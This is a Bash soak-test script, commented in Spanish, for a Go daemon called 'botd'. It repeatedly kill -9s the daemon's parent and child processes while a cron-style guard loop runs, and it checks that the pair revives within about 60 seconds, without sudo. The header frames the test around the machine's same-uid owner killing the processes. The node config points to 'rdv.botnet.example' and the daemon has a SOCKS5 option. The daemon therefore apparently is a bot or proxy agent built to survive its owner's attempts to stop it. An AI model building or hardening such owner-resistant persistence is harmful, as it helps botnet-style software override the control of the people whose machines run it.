#!/usr/bin/env bash
# owner_kill_soak — T-0506 (A3-05): el dueño same-uid puede matar
# procesos del nodo. Este soak hace kill -9 aleatorio del padre, del
# hijo o de ambos KILLS veces, con el cron (aqui: bucle `botd --guard`
# cada CRON s) vivo, y aserta:
#   * KILLS/KILLS recuperaciones (el par vuelve a 2 procesos).
#   * mediana de revival < 60 s y peor caso ≤ 70 s (T-0503 AC2).
#   * cero interaccion con root: ni un `sudo` en todo el script.
#
# Uso:  bash scripts/soak/owner_kill_soak.sh --kills=30 [--cron=60]
#       CRON=5 (acelerado en host) — la mediana se sigue midiendo en
#       segundos reales y la cota de 60 s no se toca.
# En Git Bash (Windows) el kill -9 es taskkill por WINPID (ps -W); en
# Linux, kill -9 directo — mismo criterio, doble herramienta anotado
# en docs/runbooks/persistence.md.
set -euo pipefail
cd "$(git rev-parse --show-toplevel 2>/dev/null || echo .)"
source scripts/env.sh

KILLS=30
CRON=60
for a in "$@"; do
  case "$a" in
    --kills=*) KILLS="${a#--kills=}" ;;
    --cron=*) CRON="${a#--cron=}" ;;
    *) echo "uso: $0 --kills=30 [--cron=60]" >&2; exit 2 ;;
  esac
done

TMP=$(mktemp -d)
DATA=$TMP/data
BIN=$TMP/bin
# TAG: nombre unico del tmpdir; en Git Bash el hijo aparece en `ps -W`
# con la ruta Windows (botd.exe) y el padre con la ruta /tmp: ambos
# comparten TAG, y ninguna otra fila del ps lo lleva.
TAG=$(basename "$TMP")
mkdir -p "$DATA" "$BIN"

EXT=""
[[ "$OSTYPE" == msys* || "$OSTYPE" == cygwin* ]] && EXT=".exe"
go build -o "$BIN/botd$EXT" ./cmd/botd
# apistub: doble del backend F1 en host sin red — si no, el agente del
# soak muere al primer heartbeat (DNS inexistente) y el par nunca esta
# establemente en 2 procesos.
go build -o "$BIN/apistub$EXT" ./scripts/soak/apistub
"$BIN/apistub$EXT" --addr 127.0.0.1:0 > "$TMP/stub.port" 2>/dev/null &
STUB_PID=$!
for i in $(seq 1 40); do [ -s "$TMP/stub.port" ] && break; sleep 0.25; done
[ -s "$TMP/stub.port" ] || { echo "owner_kill_soak: apistub no escuchando" >&2; exit 1; }
cat > "$DATA/cfg.json" <<JSON
{"endpoint":"http://127.0.0.1:$(cat "$TMP/stub.port" | head -1)","node_dir":"$DATA","interval_s":900}
JSON

cat > "$DATA/node.json" <<'JSON'
{
  "node_id": "11111111-1111-2222-3333-444444444444",
  "slug": "soaksoak0001",
  "arch": "amd64",
  "rendezvous": ["rdv.botnet.example:443"],
  "ttl_s": 900,
  "agent_ver": "v0.1.0"
}
JSON

LOG=$TMP/botd.log
PIDFILE=$DATA/botd.pid
TIMES=$TMP/revival_times
: > "$TIMES"
IS_WIN=0
[ -n "$EXT" ] && IS_WIN=1

GUARD_PID=""
cleanup() {
  [ -n "$GUARD_PID" ] && kill -9 "$GUARD_PID" 2>/dev/null || true
  if [ "$IS_WIN" = "1" ]; then
    taskkill //F //IM apistub.exe >/dev/null 2>&1 || true
  else
    kill -9 "${STUB_PID:-}" 2>/dev/null || true
  fi
  for p in $(cat "$PIDFILE" 2>/dev/null || true) $(child_of "$(cat "$PIDFILE" 2>/dev/null || echo 0)"); do
    kill -9 "$p" 2>/dev/null || true
  done
  # `|| true`: en Windows el botd recièn matado puede dejar botd.pid
  # busy; un cleanup no-cero con `set -e` convirtiendo exit 1 un run OK.
  rm -rf "$TMP" 2>/dev/null || true
}
trap cleanup EXIT

is_alive() { # pid en espacio WINPID (el que escribe Go en el pidfile)
  local pid=$1
  if [ "$IS_WIN" = "1" ]; then
    ps -W 2>/dev/null | awk -v p="$pid" '$4==p' | grep -q .
  else
    kill -0 "$pid" 2>/dev/null
  fi
}

# wait_bash_job: cosecha el job de bash cuyo pid matamos. El padre del
# par nacio con `&` en este script, asi que tras taskkill queda como
# job zombi del table; `wait` lo retira. Un pid que no es job propio
# devuelve 127 y aqui no es error (solo queriamos retirar el nuestro).
wait_bash_job() {
  local pid=${1:-}
  [ -n "$pid" ] || return 0
  wait "$pid" 2>/dev/null || true
}

kill_pid() {
  local pid=$1 i wp
  [ -z "$pid" ] && return 0
  if [ "$IS_WIN" = "1" ]; then
    wp=$(ps -W 2>/dev/null | awk -v p="$pid" '$4==p {print $4; exit}')
    [ -n "$wp" ] && taskkill //F //PID "$wp" >/dev/null 2>&1 || true
    wait_bash_job "$pid"
  else
    kill -9 "$pid" 2>/dev/null || true
  fi
  for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
    is_alive "$pid" || return 0
    sleep 0.1
  done
  echo "owner_kill_soak: pid $pid sigue vivo tras kill -9" >&2
  return 1
}

botd_procs() {
  if [ "$IS_WIN" = "1" ]; then
    # el hijo nace via os.Executable(): su fila de ps trae la ruta
    # Windows; el padre, la /tmp. Ambas comparten el TAG unico del
    # tmpdir y cada proc sale en 2 filas -> WINPID unico por proceso.
    # El segundo grep deja fuera apistub.exe (mismo TAG, no es botd).
    # `|| true`: con `set -o pipefail` un grep sin coincidencias (0
    # procesos) devuelve 1 y mataba al llamante en `n=$(botd_procs)`.
    local c
    c=$(ps -W 2>/dev/null | grep -iF "$TAG" | grep -iF botd | awk '{print $4}' | sort -un | wc -l | tr -d ' ' || true)
    echo "${c:-0}"
  else
    pgrep -f "$BIN/botd --(parent|child)" 2>/dev/null | wc -l | tr -d ' ' || echo 0
  fi
}

child_of() {
  if [ "$IS_WIN" = "1" ]; then
    # ppids de ps no valen (el hijo win-nativo sale con PPID=0): el
    # padre loguea cada spawn con "spawn hijo... pid=N" (WINPID).
    local c
    c=$(grep -o '"msg":"watchdog spawn hijo","pid":[0-9]*' "$LOG" 2>/dev/null | tail -1 | sed 's/.*pid"://')
    [ -n "$c" ] && { echo "$c"; return 0; }
    local ms
    ms=$(ps -W 2>/dev/null | awk -v p="$1" '$4==p {print $1; exit}')
    [ -n "$ms" ] && ps -W 2>/dev/null | awk -v p="$ms" '$2==p {print $4; exit}'
  else
    ps -o ppid=,pid= 2>/dev/null | awk -v p="$1" '$1==p {print $2; exit}'
  fi
}

wait_pair() {
  local limit=${1:-90} i
  for i in $(seq 1 $((limit * 4))); do
    local n
    n=$(botd_procs)
    if [ "${n:-0}" -ge 2 ] && [ -s "$PIDFILE" ] && is_alive "$(cat "$PIDFILE" 2>/dev/null || echo x)"; then
      return 0
    fi
    sleep 0.25
  done
  return 1
}

spawn_parent() {
  "$BIN/botd$EXT" --config "$DATA/cfg.json" --parent --node-dir "$DATA" --socks5-addr '' --run-for 7200s >>"$LOG" 2>&1 &
  PARENT_BPID=$!
}

# --- cron simulado: el guard es la linea de cron real (T-0503) ---------
( while :; do "$BIN/botd$EXT" --config "$DATA/cfg.json" --guard --node-dir "$DATA" >>"$LOG" 2>&1 || true; sleep "$CRON"; done ) &
GUARD_PID=$!

spawn_parent
wait_pair 30 || { echo "owner_kill_soak: el par no arranco (ver $LOG)" >&2; exit 1; }
PARENT_WIN=$(cat "$PIDFILE") # ver nota en kill_pid: kill_pid hace `wait` del job tras matar al original

rec=0
worst=0
for ((i = 1; i <= KILLS; i++)); do
  pp=$(cat "$PIDFILE" 2>/dev/null || echo "")
  cp=$(child_of "${pp:-0}")
  case $((RANDOM % 3)) in
    0) kill_pid "${cp:-$pp}" ;;
    1) kill_pid "${pp:-$cp}" ;;
    2) kill_pid "$cp"; kill_pid "$pp" ;;
  esac
  start=$(date +%s)
  if wait_pair 90; then
    d=$(( $(date +%s) - start ))
    rec=$((rec + 1))
    echo "$d" >> "$TIMES"
    [ "$d" -gt "$worst" ] && worst=$d
    [ "$d" -gt 70 ] && { echo "ciclo $i: revival ${d}s > 70 s (cota T-0503 AC2)" >&2; exit 1; }
  else
    echo "ciclo $i: sin recuperacion en 90 s" >&2
    exit 1
  fi
done

# --- mediana en segundos reales ----------------------------------------
# int() en el indice: con KILLS par (30, el criterio literal) (NR+1)/2
# daria 15.5 y awk indexaria a["15.5"] — inexistente — dejando mediana vacia.
median=$(sort -n "$TIMES" | awk '{a[NR]=$1} END {print a[int((NR+1)/2)]}')
[ "$rec" -eq "$KILLS" ] || { echo "owner_kill_soak: recuperaciones $rec/$KILLS" >&2; exit 1; }
[ "$median" -lt 60 ] || { echo "owner_kill_soak: mediana ${median}s >= 60 s" >&2; exit 1; }

pp=$(cat "$PIDFILE" 2>/dev/null || true)
kill_pid "${pp:-0}"; kill_pid "$(child_of "${pp:-0}")"
sleep 2
# segunda pasada: la re-eleccion (T-0502) puede dejar 1 holder
# promocionado; se tolera <=1 re-elegido, no un rastro de procesos.
pp=$(cat "$PIDFILE" 2>/dev/null || true)
# `|| true`: si la re-eleccion ya vacio el pidfile, el AND-list devuelve
# 1 y `set -e` mataba el script en silencio justo antes del OK final.
[ -n "${pp:-}" ] && kill_pid "$pp" || true
kill_pid "$(child_of "${pp:-0}")"
n=$(botd_procs)
[ "${n:-0}" -le 1 ] || { echo "owner_kill_soak: restantes=$n al cerrar (want <=1 re-elegido)" >&2; exit 1; }

echo "owner_kill_soak: OK — kills=$KILLS recuperaciones=$rec/$KILLS mediana=${median}s peor=${worst}s cron=${CRON}s host=$(uname -s) sudo=0"
